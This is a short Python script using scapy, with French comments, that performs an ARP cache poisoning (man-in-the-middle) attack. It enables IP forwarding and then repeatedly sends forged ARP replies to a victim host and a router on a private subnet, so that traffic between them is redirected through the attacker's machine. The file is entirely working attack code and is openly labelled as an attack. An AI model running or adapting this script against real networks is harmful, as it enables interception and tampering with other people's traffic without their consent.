from scapy.all import *
import os

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

# Cibles
victim_ip = "10.2.1.15"
router_ip = "10.2.1.254"
attacker_mac = "00:0c:29:c1:9a:96"

def poison(victim_ip, victim_mac, target_ip):
    arp_response = ARP(pdst=victim_ip, hwdst=victim_mac, psrc=target_ip, op="is-at")
    send(arp_response, verbose=False)

try:
    print("\n[+] Lancement de l'attaque...")
    while True:
        poison(victim_ip=victim_ip, victim_mac="0:c:29:c8:f0:fb", target_ip=router_ip)
        poison(victim_ip=router_ip, victim_mac="00:50:79:66:68:01", target_ip=victim_ip)
except KeyboardInterrupt:
    print("\n[+] Arrêt de l'attaque...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
